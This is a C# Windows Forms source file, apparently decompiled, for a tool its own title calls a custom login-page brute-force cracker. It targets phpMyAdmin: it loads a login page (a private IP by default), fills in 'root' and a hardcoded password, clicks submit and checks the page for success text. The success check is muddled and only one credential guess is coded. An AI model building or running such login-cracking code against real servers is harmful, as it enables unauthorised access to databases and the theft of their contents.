namespace K8_Web_Submit
{
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Windows.Forms;

    public class frmDiyLoginCrack : Form
    {
        private Button btn_ClsLoginURL;
        private Button btn_loginCrackPhpmyadmin;
        private Button btn_loginURLcrack;
        private Button btn_navigateLoginUrl;
        private IContainer components = null;
        private GroupBox groupBox1;
        private Label label13;
        private Label label15;
        private Label label16;
        private Label label17;
        private Label label20;
        private Label label21;
        private TabPage tab_WebBrowser;
        private TabControl tabControl2;
        private TextBox txt_loginSubmitElemen;
        private TextBox txt_loginSubmitElemenID;
        private TextBox txt_loginSubmitType;
        private TextBox txt_loginSubmitValue;
        private TextBox txt_webLoginURL;
        private WebBrowser web_LoginCrack;

        public frmDiyLoginCrack()
        {
            this.InitializeComponent();
        }

        private void btn_ClsLoginURL_Click(object sender, EventArgs e)
        {
            this.txt_webLoginURL.Clear();
        }

        private void btn_loginURLcrack_Click(object sender, EventArgs e)
        {
            HtmlElementCollection elementsByTagName = this.web_LoginCrack.Document.GetElementsByTagName(this.txt_loginSubmitElemen.Text);
            foreach (HtmlElement element in elementsByTagName)
            {
                if (element.GetAttribute("type").Equals(this.txt_loginSubmitType.Text, StringComparison.CurrentCultureIgnoreCase))
                {
                    element.InvokeMember("click");
                }
            }
        }

        private void btn_navigateLoginUrl_Click(object sender, EventArgs e)
        {
            this.web_LoginCrack.Navigate(this.txt_webLoginURL.Text);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.K8phpmyadminCrack();
            string str = this.web_LoginCrack.Document.Body.OuterText.ToString();
            if ((!str.Contains("#1045") | !str.Contains("phpMyAdmin - Error")) | !str.Contains("空密码登录被禁止"))
            {
                if (str == ">Change password</a>")
                {
                    MessageBox.Show("英文版正确");
                }
                else if (str == ">修改密码</a>")
                {
                    MessageBox.Show("中文版正确");
                }
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void frmDiyLoginCrack_Load(object sender, EventArgs e)
        {
            base.CenterToParent();
        }

        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(frmDiyLoginCrack));
            this.btn_loginCrackPhpmyadmin = new Button();
            this.label20 = new Label();
            this.txt_webLoginURL = new TextBox();
            this.btn_navigateLoginUrl = new Button();
            this.btn_loginURLcrack = new Button();
            this.btn_ClsLoginURL = new Button();
            this.label13 = new Label();
            this.tabControl2 = new TabControl();
            this.tab_WebBrowser = new TabPage();
            this.web_LoginCrack = new WebBrowser();
            this.groupBox1 = new GroupBox();
            this.label21 = new Label();
            this.txt_loginSubmitElemenID = new TextBox();
            this.label17 = new Label();
            this.txt_loginSubmitElemen = new TextBox();
            this.label16 = new Label();
            this.txt_loginSubmitType = new TextBox();
            this.label15 = new Label();
            this.txt_loginSubmitValue = new TextBox();
            this.tabControl2.SuspendLayout();
            this.tab_WebBrowser.SuspendLayout();
            this.groupBox1.SuspendLayout();
            base.SuspendLayout();
            this.btn_loginCrackPhpmyadmin.Location = new Point(0x267, 7);
            this.btn_loginCrackPhpmyadmin.Name = "btn_loginCrackPhpmyadmin";
            this.btn_loginCrackPhpmyadmin.Size = new Size(0x4b, 0x17);
            this.btn_loginCrackPhpmyadmin.TabIndex = 0x56;
            this.btn_loginCrackPhpmyadmin.Text = "破PHPadmin";
            this.btn_loginCrackPhpmyadmin.UseVisualStyleBackColor = true;
            this.btn_loginCrackPhpmyadmin.Click += new EventHandler(this.button1_Click);
            this.label20.AutoSize = true;
            this.label20.Location = new Point(150, 0x36);
            this.label20.Name = "label20";
            this.label20.Size = new Size(0x53, 12);
            this.label20.TabIndex = 0x55;
            this.label20.Text = "登陆按钮信息:";
            this.txt_webLoginURL.Location = new Point(0x4d, 9);
            this.txt_webLoginURL.Name = "txt_webLoginURL";
            this.txt_webLoginURL.Size = new Size(0x206, 0x15);
            this.txt_webLoginURL.TabIndex = 0x4f;
            this.txt_webLoginURL.Text = "http://192.168.85.182/phpmyadmin/";
            this.btn_navigateLoginUrl.Location = new Point(0x321, 7);
            this.btn_navigateLoginUrl.Name = "btn_navigateLoginUrl";
            this.btn_navigateLoginUrl.Size = new Size(0x4b, 0x17);
            this.btn_navigateLoginUrl.TabIndex = 0x53;
            this.btn_navigateLoginUrl.Text = "浏览页面";
            this.btn_navigateLoginUrl.UseVisualStyleBackColor = true;
            this.btn_navigateLoginUrl.Click += new EventHandler(this.btn_navigateLoginUrl_Click);
            this.btn_loginURLcrack.Location = new Point(0x372, 7);
            this.btn_loginURLcrack.Name = "btn_loginURLcrack";
            this.btn_loginURLcrack.Size = new Size(0x4b, 0x17);
            this.btn_loginURLcrack.TabIndex = 0x52;
            this.btn_loginURLcrack.Text = "点击提交按钮";
            this.btn_loginURLcrack.UseVisualStyleBackColor = true;
            this.btn_loginURLcrack.Click += new EventHandler(this.btn_loginURLcrack_Click);
            this.btn_ClsLoginURL.Location = new Point(720, 7);
            this.btn_ClsLoginURL.Name = "btn_ClsLoginURL";
            this.btn_ClsLoginURL.Size = new Size(0x4b, 0x17);
            this.btn_ClsLoginURL.TabIndex = 0x51;
            this.btn_ClsLoginURL.Text = "清空URL";
            this.btn_ClsLoginURL.UseVisualStyleBackColor = true;
            this.label13.AutoSize = true;
            this.label13.Location = new Point(12, 12);
            this.label13.Name = "label13";
            this.label13.Size = new Size(0x3b, 12);
            this.label13.TabIndex = 80;
            this.label13.Text = "登陆页面:";
            this.tabControl2.Controls.Add(this.tab_WebBrowser);
            this.tabControl2.Location = new Point(0x1c, 0x59);
            this.tabControl2.Name = "tabControl2";
            this.tabControl2.SelectedIndex = 0;
            this.tabControl2.Size = new Size(0x3a1, 0x18d);
            this.tabControl2.TabIndex = 0x4e;
            this.tab_WebBrowser.Controls.Add(this.web_LoginCrack);
            this.tab_WebBrowser.Location = new Point(4, 0x16);
            this.tab_WebBrowser.Name = "tab_WebBrowser";
            this.tab_WebBrowser.Padding = new Padding(3);
            this.tab_WebBrowser.Size = new Size(0x399, 0x173);
            this.tab_WebBrowser.TabIndex = 0;
            this.tab_WebBrowser.Text = "模拟点击破解";
            this.tab_WebBrowser.UseVisualStyleBackColor = true;
            this.web_LoginCrack.Dock = DockStyle.Fill;
            this.web_LoginCrack.Location = new Point(3, 3);
            this.web_LoginCrack.MinimumSize = new Size(20, 20);
            this.web_LoginCrack.Name = "web_LoginCrack";
            this.web_LoginCrack.Size = new Size(0x393, 0x16d);
            this.web_LoginCrack.TabIndex = 0;
            this.groupBox1.Controls.Add(this.label21);
            this.groupBox1.Controls.Add(this.txt_loginSubmitElemenID);
            this.groupBox1.Controls.Add(this.label17);
            this.groupBox1.Controls.Add(this.txt_loginSubmitElemen);
            this.groupBox1.Controls.Add(this.label16);
            this.groupBox1.Controls.Add(this.txt_loginSubmitType);
            this.groupBox1.Controls.Add(this.label15);
            this.groupBox1.Controls.Add(this.txt_loginSubmitValue);
            this.groupBox1.Location = new Point(240, 0x24);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new Size(0x2a7, 0x2f);
            this.groupBox1.TabIndex = 0x54;
            this.groupBox1.TabStop = false;
            this.label21.AutoSize = true;
            this.label21.Location = new Point(0xb8, 0x11);
            this.label21.Name = "label21";
            this.label21.Size = new Size(0x2f, 12);
            this.label21.TabIndex = 0x49;
            this.label21.Text = "ID(id):";
            this.txt_loginSubmitElemenID.Location = new Point(0xed, 14);
            this.txt_loginSubmitElemenID.Name = "txt_loginSubmitElemenID";
            this.txt_loginSubmitElemenID.Size = new Size(0x4a, 0x15);
            this.txt_loginSubmitElemenID.TabIndex = 0x48;
            this.txt_loginSubmitElemenID.Text = "input_go";
            this.label17.AutoSize = true;
            this.label17.Location = new Point(6, 0x11);
            this.label17.Name = "label17";
            this.label17.Size = new Size(0x53, 12);
            this.label17.TabIndex = 0x47;
            this.label17.Text = "元素(Elemen):";
            this.txt_loginSubmitElemen.Location = new Point(0x5f, 14);
            this.txt_loginSubmitElemen.Name = "txt_loginSubmitElemen";
            this.txt_loginSubmitElemen.Size = new Size(0x53, 0x15);
            this.txt_loginSubmitElemen.TabIndex = 70;
            this.txt_loginSubmitElemen.Text = "input";
            this.label16.AutoSize = true;
            this.label16.Location = new Point(0x13d, 0x11);
            this.label16.Name = "label16";
            this.label16.Size = new Size(0x47, 12);
            this.label16.TabIndex = 0x45;
            this.label16.Text = "类型(type):";
            this.txt_loginSubmitType.Location = new Point(0x18a, 14);
            this.txt_loginSubmitType.Name = "txt_loginSubmitType";
            this.txt_loginSubmitType.Size = new Size(100, 0x15);
            this.txt_loginSubmitType.TabIndex = 0x44;
            this.txt_loginSubmitType.Text = "submit";
            this.label15.AutoSize = true;
            this.label15.Location = new Point(500, 0x11);
            this.label15.Name = "label15";
            this.label15.Size = new Size(0x41, 12);
            this.label15.TabIndex = 0x43;
            this.label15.Text = "值(value):";
            this.txt_loginSubmitValue.Location = new Point(0x239, 14);
            this.txt_loginSubmitValue.Name = "txt_loginSubmitValue";
            this.txt_loginSubmitValue.Size = new Size(100, 0x15);
            this.txt_loginSubmitValue.TabIndex = 0x42;
            this.txt_loginSubmitValue.Text = "执行";
            base.AutoScaleDimensions = new SizeF(6f, 12f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x3cf, 0x207);
            base.Controls.Add(this.btn_loginCrackPhpmyadmin);
            base.Controls.Add(this.label20);
            base.Controls.Add(this.txt_webLoginURL);
            base.Controls.Add(this.btn_navigateLoginUrl);
            base.Controls.Add(this.btn_loginURLcrack);
            base.Controls.Add(this.btn_ClsLoginURL);
            base.Controls.Add(this.label13);
            base.Controls.Add(this.tabControl2);
            base.Controls.Add(this.groupBox1);
            base.Icon = (Icon) manager.GetObject("$this.Icon");
            base.Name = "frmDiyLoginCrack";
            this.Text = "K8自定义登陆页面爆力破解";
            base.Load += new EventHandler(this.frmDiyLoginCrack_Load);
            this.tabControl2.ResumeLayout(false);
            this.tab_WebBrowser.ResumeLayout(false);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        private void K8phpmyadminCrack()
        {
            HtmlElement element = null;
            HtmlDocument document = this.web_LoginCrack.Document;
            for (int i = 0; i < document.All.Count; i++)
            {
                if (document.All[i].TagName.ToUpper().Equals("INPUT"))
                {
                    string name = document.All[i].Name;
                    if (name != null)
                    {
                        if (!(name == "pma_username"))
                        {
                            if (name == "pma_password")
                            {
                                goto Label_00B0;
                            }
                            if (name == "B1")
                            {
                                goto Label_00CC;
                            }
                        }
                        else
                        {
                            document.All[i].InnerText = "root";
                        }
                    }
                }
                continue;
            Label_00B0:
                document.All[i].InnerText = "k8team222";
                continue;
            Label_00CC:
                element = document.All[i];
            }
            HtmlElementCollection elementsByTagName = this.web_LoginCrack.Document.GetElementsByTagName(this.txt_loginSubmitElemen.Text);
            foreach (HtmlElement element2 in elementsByTagName)
            {
                if (element2.GetAttribute("type").Equals(this.txt_loginSubmitType.Text, StringComparison.CurrentCultureIgnoreCase))
                {
                    element2.InvokeMember("click");
                }
            }
        }
    }
}

